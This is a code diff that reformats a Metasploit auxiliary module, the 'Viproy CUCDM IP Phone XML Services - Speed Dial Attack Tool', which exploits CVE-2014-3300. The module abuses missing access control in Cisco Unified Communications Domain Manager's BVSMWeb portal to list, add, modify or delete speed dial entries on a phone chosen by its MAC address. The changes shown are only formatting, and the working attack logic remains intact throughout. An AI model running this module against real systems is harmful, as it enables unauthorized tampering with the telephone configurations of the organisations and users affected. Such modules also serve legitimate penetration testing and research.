@@ -8,65 +8,66 @@ require 'rexml/document'
 class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::HttpClient
 
-  def initialize(info={})
-    super(update_info(info,
-      'Name'          => 'Viproy CUCDM IP Phone XML Services - Speed Dial Attack Tool',
-      'Description'   => %q{
-        The BVSMWeb portal in the web framework in Cisco Unified Communications Domain Manager
-        (CDM), before version 10, doesn't implement access control properly, which allows remote
-        attackers to modify user information. This module exploits the vulnerability to make
-        unauthorized speed dial entity manipulations.
-      },
-      'Author'        => 'fozavci',
-      'References'    =>
-        [
+  def initialize(info = {})
+    super(
+      update_info(
+        info,
+        'Name' => 'Viproy CUCDM IP Phone XML Services - Speed Dial Attack Tool',
+        'Description' => %q{
+          The BVSMWeb portal in the web framework in Cisco Unified Communications Domain Manager
+          (CDM), before version 10, doesn't implement access control properly, which allows remote
+          attackers to modify user information. This module exploits the vulnerability to make
+          unauthorized speed dial entity manipulations.
+        },
+        'Author' => 'fozavci',
+        'References' => [
           ['CVE', '2014-3300'],
           ['BID', '68331']
         ],
-      'License'       => MSF_LICENSE,
-      'Actions'       =>
-        [
-          [ 'List',   { 'Description' => 'Getting the speeddials for the MAC address' } ],
+        'License' => MSF_LICENSE,
+        'Actions' => [
+          [ 'List', { 'Description' => 'Getting the speeddials for the MAC address' } ],
           [ 'Modify', { 'Description' => 'Modifying a speeddial for the MAC address' } ],
-          [ 'Add',    { 'Description' => 'Adding a speeddial for the MAC address' } ],
+          [ 'Add', { 'Description' => 'Adding a speeddial for the MAC address' } ],
           [ 'Delete', { 'Description' => 'Deleting a speeddial for the MAC address' } ]
         ],
-      'DefaultAction'  => 'List'
-    ))
+        'DefaultAction' => 'List'
+      )
+    )
 
     register_options(
-    [
-      OptString.new('TARGETURI', [ true, 'Target URI for XML services', '/bvsmweb']),
-      OptString.new('MAC', [ true, 'MAC Address of target phone', '000000000000']),
-      OptString.new('NAME', [ false, 'Name for Speed Dial', 'viproy']),
-      OptString.new('POSITION', [ false, 'Position for Speed Dial', '1']),
-      OptString.new('TELNO', [ false, 'Phone number for Speed Dial', '007']),
-    ])
+      [
+        OptString.new('TARGETURI', [ true, 'Target URI for XML services', '/bvsmweb']),
+        OptString.new('MAC', [ true, 'MAC Address of target phone', '000000000000']),
+        OptString.new('NAME', [ false, 'Name for Speed Dial', 'viproy']),
+        OptString.new('POSITION', [ false, 'Position for Speed Dial', '1']),
+        OptString.new('TELNO', [ false, 'Phone number for Speed Dial', '007']),
+      ]
+    )
   end
 
   def run
-
     case action.name.upcase
-      when 'MODIFY'
-        modify
-      when 'DELETE'
-        delete
-      when 'ADD'
-        add
-      when 'LIST'
-        list
+    when 'MODIFY'
+      modify
+    when 'DELETE'
+      delete
+    when 'ADD'
+      add
+    when 'LIST'
+      list
     end
-
   end
 
   def send_rcv(uri, vars_get)
     uri = normalize_uri(target_uri.to_s, uri.to_s)
     res = send_request_cgi(
       {
-        'uri'    => uri,
+        'uri' => uri,
         'method' => 'GET',
         'vars_get' => vars_get
-      })
+      }
+    )
 
     if res && res.code == 200 && res.body && res.body.to_s =~ /Speed [D|d]ial/
       return Exploit::CheckCode::Vulnerable, res
@@ -84,9 +85,9 @@ class MetasploitModule < Msf::Auxiliary
     list = doc.root.get_elements('DirectoryEntry')
     list.each do |lst|
       xlist = lst.get_elements('Name')
-      xlist.each {|l| names << "#{l[0]}"}
+      xlist.each { |l| names << "#{l[0]}" }
       xlist = lst.get_elements('Telephone')
-      xlist.each {|l| phones << "#{l[0]}" }
+      xlist.each { |l| phones << "#{l[0]}" }
     end
 
     if names.size > 0
